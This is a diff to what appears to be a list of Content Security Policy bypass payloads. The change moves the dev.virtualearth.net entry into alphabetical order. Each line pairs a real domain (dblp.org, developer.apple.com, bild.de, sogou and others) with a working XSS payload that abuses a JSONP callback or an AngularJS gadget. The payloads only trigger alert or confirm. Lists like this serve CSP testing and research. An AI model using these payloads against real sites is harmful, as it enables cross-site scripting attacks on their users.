@@ -70,6 +70,7 @@ d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV
 d1xrp9zhb3ks3c.cloudfront.net	<body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 dblp.org	<script src="https://dblp.org/search/venue/api?q=&h=1000&c=0&rd=1a&format=jsonp&callback=alert"></script>
 demo.matomo.cloud	<script src="https://demo.matomo.cloud/?module=API&method=Overlay.getTranslations&idSite=1&format=JSON&callback=alert"></script>
+dev.virtualearth.net	<script src="https://dev.virtualearth.net/REST/v1/Imagery/Metadata/Road?jsonp=alert(document.domain);//"></script>
 developer.apple.com	<script src="https://developer.apple.com/search/scripts/vendor/angular-custom.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 documentation-resources.opendatasoft.com	<script src="https://documentation-resources.opendatasoft.com/api/datasets/1.0/doc-geonames-cities-5000/?format=jsonp&callback=confirm(1);"></script>
 don.bild.de	<script src="https://don.bild.de/glg/userDetails?callback=alert"></script>
@@ -210,4 +211,3 @@ yuedust.yuedu.126.net	<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/j
 yugiohmonstrosdeduelo.blogspot.com	<script src="https://yugiohmonstrosdeduelo.blogspot.com/feeds/posts/summary?callback=alert"></script>
 zhike.help.360.cn	<script src="https://zhike.help.360.cn/api/v1/robotWindow?callback=alert(1)-"></script>
 zhuanjia.sogou.com	<script src="https://zhuanjia.sogou.com/base/ajax/login/login-init?callback=alert(1)-"></script>
-dev.virtualearth.net	<script src="https://dev.virtualearth.net/REST/v1/Imagery/Metadata/Road?jsonp=alert(document.domain);//"></script>
